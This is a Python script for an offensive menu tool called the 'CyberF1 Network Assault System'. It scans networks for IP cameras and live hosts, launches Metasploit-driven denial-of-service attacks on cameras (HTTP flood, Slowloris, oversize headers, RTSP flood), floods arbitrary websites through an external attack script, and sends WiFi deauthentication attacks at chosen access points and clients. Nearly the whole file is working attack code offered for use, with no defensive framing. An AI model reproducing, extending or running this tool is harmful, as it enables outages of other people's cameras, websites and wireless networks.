import subprocess
import time
import os
import socket
import threading
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
import json
import sys
import platform
import requests
import getpass

# ANSI color codes
GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
BLUE = "\033[94m"
RESET = "\033[0m"

# Hacker-style ASCII art
HACKER_ART = f"""
{CYAN}       .-""""""""-.
     .'          '.
    /   CYBERF1   \
   : ,  ELITE OPS  :
    `._          _.'
       `._[v2.3]_.'  
{GREEN} ____    _  _____ _______   __ _    
/ ___|  / \|_   _| ____\ \ / // \   
\___ \ / _ \ | | |  _|  \ V // _ \  
 ___) / ___ \| | | |___  | |/ ___ \ 
|____/_/   \_\_| |_____| |_/_/   \_{RESET}
{CYAN}   | NETWORK ASSAULT SYSTEM |{RESET}
"""

# Reference to external attack script
nnd_sec_file = "attack.py"

# Authentication function
def authenticate():
    valid_username = "kali"
    valid_password = "kali"
    max_attempts = 3
    attempt = 0

    os.system('clear' if os.name == 'posix' else 'cls')
    print(HACKER_ART)
    print(f"{BLUE}[*] System Access Control{RESET}")

    while attempt < max_attempts:
        username = input(f"{CYAN}[>] Enter username: {RESET}")
        password = getpass.getpass(f"{CYAN}[>] Enter password: {RESET}")

        if username == valid_username and password == valid_password:
            print(f"{GREEN}[+] Access granted. Welcome, {username}.{RESET}")
            time.sleep(1)
            return True
        else:
            attempt += 1
            remaining = max_attempts - attempt
            print(f"{RED}[!] Invalid credentials. {remaining} attempts remaining.{RESET}")
            time.sleep(1)
            os.system('clear' if os.name == 'posix' else 'cls')
            print(HACKER_ART)
            print(f"{BLUE}[*] System Access Control{RESET}")

    print(f"{RED}[!] Maximum attempts exceeded. System locked.{RESET}")
    time.sleep(2)
    sys.exit(1)

# Function to install a package via a command
def install_package(cmd, name, shell=True):
    print(f"{BLUE}[*] Attempting to install {name}...{RESET}")
    try:
        subprocess.run(cmd, shell=shell, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}[+] {name} installed successfully.{RESET}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Failed to install {name}: {e}{RESET}")
        return False
    except Exception as e:
        print(f"{RED}[!] Error during install: {e}{RESET}")
        return False

# Enhanced dependency setup with auto-install
def setup_dependencies():
    print(f"{BLUE}[*] Initializing dependency check and auto-install...{RESET}")
    os_name = platform.system().lower()

    if sys.version_info.major < 3:
        print(f"{RED}[!] Python 3 required. Current version: {sys.version}{RESET}")
        sys.exit(1)

    # Detect package manager
    pkg_manager = None
    if os_name == "linux":
        if subprocess.run("which apt", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
            pkg_manager = "apt"
        elif subprocess.run("which yum", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
            pkg_manager = "yum"
    elif os_name == "darwin":
        if subprocess.run("which brew", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
            pkg_manager = "brew"

    dependencies = [
        {"name": "nmap", "pip_package": "python-nmap", "check_cmd": "nmap -V", "install_cmd": ["pip3", "install", "python-nmap"], "sys_install": f"sudo {pkg_manager} install -y nmap" if pkg_manager else None, "manual": "sudo apt install nmap"},
        {"name": "scapy", "pip_package": "scapy", "check_cmd": "python3 -c 'import scapy; print(scapy.__version__)'", "install_cmd": ["pip3", "install", "scapy"], "manual": "pip3 install scapy"},
        {"name": "Metasploit", "check_cmd": "msfconsole -v", "install_cmd": "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall" if os_name == "linux" else None, "manual": "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall"},
        {"name": "requests", "pip_package": "requests", "check_cmd": "python3 -c 'import requests'", "install_cmd": ["pip3", "install", "requests"], "manual": "pip3 install requests"},
        {"name": "aircrack-ng", "check_cmd": "aircrack-ng -v", "install_cmd": f"sudo {pkg_manager} install -y aircrack-ng" if pkg_manager else None, "manual": "sudo apt install aircrack-ng"}
    ]

    for dep in dependencies:
        print(f"{BLUE}[*] Checking {dep['name']}...{RESET}")
        try:
            subprocess.run(dep["check_cmd"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
            print(f"{GREEN}[+] {dep['name']} is installed.{RESET}")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{RED}[!] {dep['name']} not found.{RESET}")
            if dep.get("install_cmd"):
                if isinstance(dep["install_cmd"], list):
                    if not install_package(dep["install_cmd"], dep["name"], shell=False):
                        print(f"{CYAN}[!] Auto-install failed. Manual install: {dep['manual']}{RESET}")
                else:
                    if not install_package(dep["install_cmd"], dep["name"]):
                        print(f"{CYAN}[!] Auto-install failed. Manual install: {dep['manual']}{RESET}")
                if dep.get("sys_install"):
                    print(f"{BLUE}[*] Attempting system-level install for {dep['name']}...{RESET}")
                    install_package(dep["sys_install"], dep["name"])
            else:
                print(f"{CYAN}[!] {dep['name']} requires manual installation: {dep['manual']}{RESET}")

    print(f"{GREEN}[+] Dependency setup complete. Proceeding...{RESET}")
    time.sleep(2)

# === Existing Functions ===
def scan_port_554_nmap(network):
    print(f"{BLUE}[*] Engaging Nmap recon on {network} - Port 554...{RESET}")
    try:
        import nmap
        nm = nmap.PortScanner()
        nm.scan(hosts=network, arguments='-p 554 --open -T4')
        found_cameras = False
        print(f"{GREEN}[+] Recon Results:{RESET}")
        for host in nm.all_hosts():
            if 'tcp' in nm[host] and 554 in nm[host]['tcp']:
                print(f"{GREEN}    [+] Target Acquired: {host} - Port 554 EXPOSED{RESET}")
                found_cameras = True
        if not found_cameras:
            print(f"{RED}    [-] No vulnerabilities detected on port 554.{RESET}")
        print(f"{BLUE}[*] Recon terminated.{RESET}")
    except ImportError:
        print(f"{RED}[!] python-nmap not installed. Install with 'pip3 install python-nmap' and ensure 'nmap' is on your system.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def discover_devices(network):
    print(f"{BLUE}[*] Initiating live target enumeration on {network}. Terminate with Ctrl+C.{RESET}")
    try:
        import scapy.all as scapy
        while True:
            arp_request = scapy.ARP(pdst=network)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            os.system('clear' if os.name == 'posix' else 'cls')
            print(f"{GREEN}[+] Live Targets (Updates every 5s):{RESET}")
            print(f"{CYAN}{'HOSTNAME':<24} {'IP ADDRESS':<16} {'MAC ADDRESS':<18}{RESET}")
            print(f"{BLUE}{'-' * 60}{RESET}")
            for element in answered_list:
                ip = element[1].psrc
                mac = element[1].hwsrc
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                except:
                    hostname = "UNIDENTIFIED"
                print(f"{hostname:<24} {ip:<16} {mac:<18}")
            time.sleep(5)
    except ImportError:
        print(f"{RED}[!] Scapy not installed. Install with 'pip3 install scapy'.{RESET}")
    except KeyboardInterrupt:
        print(f"{BLUE}[*] Enumeration aborted by operator.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def dos_camera(target_ip):
    print(f"{BLUE}[*] Arming DoS payload for {target_ip}...{RESET}")
    msf_cmd = (
        f"msfconsole -q -x \"use auxiliary/dos/http/http_flood; "
        f"set RHOSTS {target_ip}; "
        f"set TARGETURI /; "
        f"set THREADS 999999999; "
        f"run; exit\""
    )
    try:
        print(f"{GREEN}[+] Unleashing HTTP flood - 999999999 threads engaged...{RESET}")
        subprocess.run(msf_cmd, shell=True, check=True)
        print(f"{GREEN}[+] Payload delivered to {target_ip}. Target neutralized.{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] Metasploit not installed. Install with: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Payload deployment failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def scan_ip_ports(ip):
    port_queue = Queue()
    print_lock = threading.Lock()

    def scan_port(ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                result = s.connect_ex((ip, port))
                if result == 0:
                    with print_lock:
                        print(f"{GREEN}    [+] Breach detected: Port {port} OPEN on {ip}{RESET}")
        except socket.error:
            pass

    def worker(ip):
        while not port_queue.empty():
            port = port_queue.get()
            scan_port(ip, port)
            port_queue.task_done()

    try:
        start_port = int(input(f"{CYAN}[>] Specify initial port (e.g., 80): {RESET}"))
        end_port = int(input(f"{CYAN}[>] Specify final port (e.g., 65535): {RESET}"))
        print(f"{BLUE}[*] Probing {ip} from port {start_port} to {end_port}...{RESET}")
        
        for port in range(start_port, end_port + 1):
            port_queue.put(port)
        
        thread_count = 50
        threads = []
        for _ in range(thread_count):
            thread = threading.Thread(target=worker, args=(ip,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        port_queue.join()
        for thread in threads:
            thread.join()
        print(f"{BLUE}[*] Port probing completed.{RESET}")
    except ValueError:
        print(f"{RED}[!] Ports must be numeric.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def scan_network_554(network_base):
    print(f"{BLUE}[*] Scanning {network_base}.0/24 for port 554 vulnerabilities...{RESET}")
    open_ips = []
    ip_parts = network_base.split('.')
    if len(ip_parts) != 3:
        print(f"{RED}[!] Invalid network format. Use e.g., 192.168.1{RESET}")
        return
    base_ip = '.'.join(ip_parts[:3]) + '.'

    def is_port_open(ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((ip, port))
                return True
        except (socket.timeout, socket.error):
            return False

    def scan_ip_554(ip):
        if is_port_open(ip, 554):
            return ip
        return None

    try:
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(scan_ip_554, f"{base_ip}{i}") for i in range(256)]
            for future in futures:
                result = future.result()
                if result:
                    open_ips.append(result)

        if open_ips:
            print(f"{GREEN}[+] Vulnerable targets identified:{RESET}")
            for ip in open_ips:
                print(f"    {CYAN}{ip}{RESET}")
        else:
            print(f"{RED}[-] No exploitable targets on port 554.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def run_nnd_sec_attack():
    if not os.path.exists(nnd_sec_file):
        print(f"{RED}[!] Alert: {nnd_sec_file} not detected in system.{RESET}")
        print(f"{RED}[!] Deploy {nnd_sec_file} to activate this weapon.{RESET}")
        input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
        return
    
    target_url = input(f"{CYAN}[>] Designate target URL (e.g., http://target.com): {RESET}")
    if not target_url:
        print(f"{RED}[!] Target URL required.{RESET}")
        return
    
    attack_duration = input(f"{CYAN}[>] Set attack duration (seconds, e.g., 60): {RESET}")
    if not attack_duration.isdigit():
        print(f"{RED}[!] Duration must be numeric.{RESET}")
        return
    
    print(f"{BLUE}[*] Activating {nnd_sec_file} - HTTP Flood Protocol...{RESET}")
    try:
        subprocess.run(["python3", nnd_sec_file, target_url, attack_duration], check=True)
        print(f"{GREEN}[+] Assault completed. Target {target_url} compromised.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Assault failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

# WiFi Deauthentication Functions
def wifi_deauth_basic(interface="wlan0mon", bssid="00:11:22:33:44:55", channel="6", client="66:77:88:99:AA:BB"):
    print(f"{BLUE}[*] Initiating Basic WiFi Deauthentication Attack...{RESET}")
    msf_cmd = (
        f"msfconsole -q -x \"use auxiliary/dos/wifi/wifidetector; "
        f"set INTERFACE {interface}; "
        f"set BSSID {bssid}; "
        f"set CHANNEL {channel}; "
        f"set CLIENT {client}; "
        f"run; exit\""
    )
    try:
        print(f"{GREEN}[+] Launching deauth attack on {bssid} for client {client}...{RESET}")
        subprocess.run(msf_cmd, shell=True, check=True)
        print(f"{GREEN}[+] Deauthentication attack completed.{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] Metasploit not installed or not in PATH.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Attack failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def wifi_deauth_broadcast(interface="wlan0mon", bssid="00:11:22:33:44:55"):
    print(f"{BLUE}[*] Initiating Broadcast WiFi Deauthentication Attack...{RESET}")
    msf_cmd = (
        f"msfconsole -q -x \"use auxiliary/dos/wifi/wifidetector; "
        f"set INTERFACE {interface}; "
        f"set BSSID {bssid}; "
        f"set BROADCAST true; "
        f"run; exit\""
    )
    try:
        print(f"{GREEN}[+] Launching broadcast deauth attack on {bssid}...{RESET}")
        subprocess.run(msf_cmd, shell=True, check=True)
        print(f"{GREEN}[+] Broadcast deauthentication attack completed.{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] Metasploit not installed or not in PATH.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Attack failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def wifi_deauth_continuous(interface="wlan0mon", bssid="00:11:22:33:44:55"):
    print(f"{BLUE}[*] Initiating Continuous WiFi Deauthentication Attack...{RESET}")
    msf_cmd = (
        f"msfconsole -q -x \"use auxiliary/dos/wifi/wifidetector; "
        f"set INTERFACE {interface}; "
        f"set BSSID {bssid}; "
        f"set PACKETS 0; "
        f"run; exit\""
    )
    try:
        print(f"{GREEN}[+] Launching continuous deauth attack on {bssid}...{RESET}")
        subprocess.run(msf_cmd, shell=True, check=True)
        print(f"{GREEN}[+] Continuous deauthentication attack completed.{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] Metasploit not installed or not in PATH.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Attack failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def wifi_deauth_targeted(interface="wlan0mon", bssid="00:11:22:33:44:55", client="66:77:88:99:AA:BB", packets="100"):
    print(f"{BLUE}[*] Initiating Targeted WiFi Deauthentication Attack...{RESET}")
    msf_cmd = (
        f"msfconsole -q -x \"use auxiliary/dos/wifi/wifidetector; "
        f"set INTERFACE {interface}; "
        f"set BSSID {bssid}; "
        f"set CLIENT {client}; "
        f"set PACKETS {packets}; "
        f"run; exit\""
    )
    try:
        print(f"{GREEN}[+] Launching targeted deauth attack on {bssid} for client {client} with {packets} packets...{RESET}")
        subprocess.run(msf_cmd, shell=True, check=True)
        print(f"{GREEN}[+] Targeted deauthentication attack completed.{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] Metasploit not installed or not in PATH.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Attack failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def wifi_deauth_menu():
    print(f"{BLUE}[*] WiFi Deauthentication Attack Options{RESET}")
    print(f"{GREEN}[1] Basic Deauth Attack{RESET}")
    print(f"{GREEN}[2] Broadcast Deauth (All Clients){RESET}")
    print(f"{GREEN}[3] Continuous Deauth Attack{RESET}")
    print(f"{GREEN}[4] Targeted Client Deauth{RESET}")
    print(f"{RED}[5] Return to Main Menu{RESET}")
    
    choice = input(f"\n{CYAN}[>] Select WiFi attack [1-5]: {RESET}")
    
    if choice in ['1', '2', '3', '4']:
        interface = input(f"{CYAN}[>] Enter interface (default: wlan0mon): {RESET}") or "wlan0mon"
        bssid = input(f"{CYAN}[>] Enter BSSID (e.g., 00:11:22:33:44:55): {RESET}")
        if not bssid:
            print(f"{RED}[!] BSSID required.{RESET}")
            return
        
        if choice == '1':
            channel = input(f"{CYAN}[>] Enter channel (e.g., 6): {RESET}") or "6"
            client = input(f"{CYAN}[>] Enter client MAC (e.g., 66:77:88:99:AA:BB): {RESET}") or "66:77:88:99:AA:BB"
            wifi_deauth_basic(interface, bssid, channel, client)
        elif choice == '2':
            wifi_deauth_broadcast(interface, bssid)
        elif choice == '3':
            wifi_deauth_continuous(interface, bssid)
        elif choice == '4':
            client = input(f"{CYAN}[>] Enter client MAC (e.g., 66:77:88:99:AA:BB): {RESET}") or "66:77:88:99:AA:BB"
            packets = input(f"{CYAN}[>] Enter number of packets (default: 100): {RESET}") or "100"
            wifi_deauth_targeted(interface, bssid, client, packets)
    elif choice == '5':
        return
    else:
        print(f"{RED}[!] Invalid choice. Select 1-5.{RESET}")
        input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

# New IP Camera DoS Functions
def slowloris_attack(target_ip, port="80"):
    print(f"{BLUE}[*] Initiating Slowloris Attack on {target_ip}...{RESET}")
    msf_cmd = (
        f"msfconsole -q -x \"use auxiliary/dos/http/slowloris; "
        f"set RHOSTS {target_ip}; "
        f"set RPORT {port}; "
        f"set VERBOSE true; "
        f"run; exit\""
    )
    try:
        print(f"{GREEN}[+] Launching Slowloris attack on {target_ip}:{port}...{RESET}")
        subprocess.run(msf_cmd, shell=True, check=True)
        print(f"{GREEN}[+] Slowloris attack completed.{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] Metasploit not installed or not in PATH.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Attack failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def http_oversize_attack(target_ip):
    print(f"{BLUE}[*] Initiating HTTP Oversize Headers Attack on {target_ip}...{RESET}")
    msf_cmd = (
        f"msfconsole -q -x \"use auxiliary/dos/http/http_oversize; "
        f"set RHOSTS {target_ip}; "
        f"run; exit\""
    )
    try:
        print(f"{GREEN}[+] Launching HTTP Oversize Headers attack on {target_ip}...{RESET}")
        subprocess.run(msf_cmd, shell=True, check=True)
        print(f"{GREEN}[+] HTTP Oversize attack completed.{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] Metasploit not installed or not in PATH.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Attack failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def rtsp_flood_attack(target_ip):
    print(f"{BLUE}[*] Initiating RTSP Flood Attack on {target_ip}...{RESET}")
    msf_cmd = (
        f"msfconsole -q -x \"use auxiliary/dos/tcp/rtsp_flood; "
        f"set RHOSTS {target_ip}; "
        f"run; exit\""
    )
    try:
        print(f"{GREEN}[+] Launching RTSP Flood attack on {target_ip}:554...{RESET}")
        subprocess.run(msf_cmd, shell=True, check=True)
        print(f"{GREEN}[+] RTSP Flood attack completed.{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] Metasploit not installed or not in PATH.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Attack failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def camera_dos_menu():
    print(f"{BLUE}[*] IP Camera DoS Attack Options{RESET}")
    print(f"{GREEN}[1] HTTP Flood (Original){RESET}")
    print(f"{GREEN}[2] Slowloris Attack (Works on most HTTP cameras){RESET}")
    print(f"{GREEN}[3] HTTP Oversize Headers (For vulnerable cameras){RESET}")
    print(f"{GREEN}[4] RTSP Flood (For cameras using RTSP on port 554){RESET}")
    print(f"{RED}[5] Return to Main Menu{RESET}")
    
    choice = input(f"\n{CYAN}[>] Select Camera DoS attack [1-5]: {RESET}")
    
    if choice in ['1', '2', '3', '4']:
        target_ip = input(f"{CYAN}[>] Enter target IP: {RESET}")
        if not target_ip:
            print(f"{RED}[!] Target IP required.{RESET}")
            return
        
        if choice == '1':
            dos_camera(target_ip)
        elif choice == '2':
            port = input(f"{CYAN}[>] Enter port (default: 80): {RESET}") or "80"
            slowloris_attack(target_ip, port)
        elif choice == '3':
            http_oversize_attack(target_ip)
        elif choice == '4':
            rtsp_flood_attack(target_ip)
    elif choice == '5':
        return
    else:
        print(f"{RED}[!] Invalid choice. Select 1-5.{RESET}")
        input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

# Main function with updated menu
def main():
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(HACKER_ART)
        print(f"{BLUE}=== CYBERF1 NETWORK ASSAULT SYSTEM ==={RESET}")
        print(f"{GREEN}[1] Scan IP Camera (Port 554){RESET}")
        print(f"{GREEN}[2] Scan User Network{RESET}")
        print(f"{RED}[3] DoS IP Camera (Multiple Methods){RESET}")
        print(f"{GREEN}[4] Single IP Port Scan (Threaded){RESET}")
        print(f"{GREEN}[5] Network Port 554 Scan (ThreadPool){RESET}")
        print(f"{RED}[6] DDOS WEBSITE (External){RESET}")
        print(f"{RED}[7] WiFi Deauthentication Attacks{RESET}")
        print(f"{GREEN}[8] TERMINATE: Exit System{RESET}")
        
        choice = input(f"\n{CYAN}[>] Select operation [1-8]: {RESET}")

        if choice in ['1', '2', '5']:
            network = input(f"{CYAN}[>] Input target network (e.g., 192.168.1): {RESET}")
            if not network:
                print(f"{RED}[!] Network designation required.{RESET}")
                input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
                continue
            
            if choice == '1':
                scan_port_554_nmap(f"{network}.0/24")
            elif choice == '2':
                discover_devices(f"{network}.0/24")
            elif choice == '5':
                scan_network_554(network)

        elif choice == '3':
            camera_dos_menu()

        elif choice == '4':
            ip = input(f"{CYAN}[>] Input IP for probing (e.g., 192.168.1.1): {RESET}")
            if not ip:
                print(f"{RED}[!] IP designation required.{RESET}")
                input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
                continue
            scan_ip_ports(ip)

        elif choice == '6':
            run_nnd_sec_attack()

        elif choice == '7':
            wifi_deauth_menu()

        elif choice == '8':
            print(f"{RED}[!] System shutdown initiated. Going dark.{RESET}")
            break

        else:
            print(f"{RED}[!] Invalid operation code. Select 1-8.{RESET}")
            input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

if __name__ == "__main__":
    print(f"{BLUE}[*] Booting CyberF1 Network Assault System...{RESET}")
    if not authenticate():
        sys.exit(1)
    setup_dependencies()
    print(f"{GREEN}[+] System online. Ready for engagement.{RESET}")
    time.sleep(1)
    main()